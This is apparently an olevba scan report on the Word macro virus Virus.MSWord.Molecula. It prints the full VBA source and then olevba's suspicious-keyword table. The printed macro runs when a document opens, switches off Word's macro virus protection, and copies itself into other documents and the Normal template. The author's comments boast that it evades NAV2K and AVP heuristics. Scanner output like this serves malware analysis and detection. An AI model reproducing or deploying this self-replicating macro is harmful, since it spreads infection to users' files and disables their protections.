olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Molecula
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Molecula - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Molecula
Private Sub Document_Open(): Const nula = 0: Const jedan = 1: Options.VirusProtection = nula
If Not ThisDocument = ActiveDocument Then Set a = ActiveDocument Else Set a = NormalTemplate
Set b = a.VBProject: Set c = b.VBComponents(1): Set d = c.CodeModule
With d: g = Strings.Trim(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(jedan, _
ThisDocument.VBProject.VBComponents(1).CodeModule.countoflines))
If .Lines(1, 1) <> "'Molecula" Then
.deletelines jedan, d.countoflines
.insertlines jedan, g
End If
End With
If Day(Now()) = jedan Then
MsgBox "...i posle svega ja sam jos tu...tu medju Vama!", vbCritical, "...Molecula"
End If
End Sub
'WM.Molecula by e[ax]
'Jos jedan virus koji moze zaobici NAV2K i AVP heuristike
'..a koji koristi String metodu inficiranja!
'Sve pozdrave saljem ljudima na #virus i #vxers







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

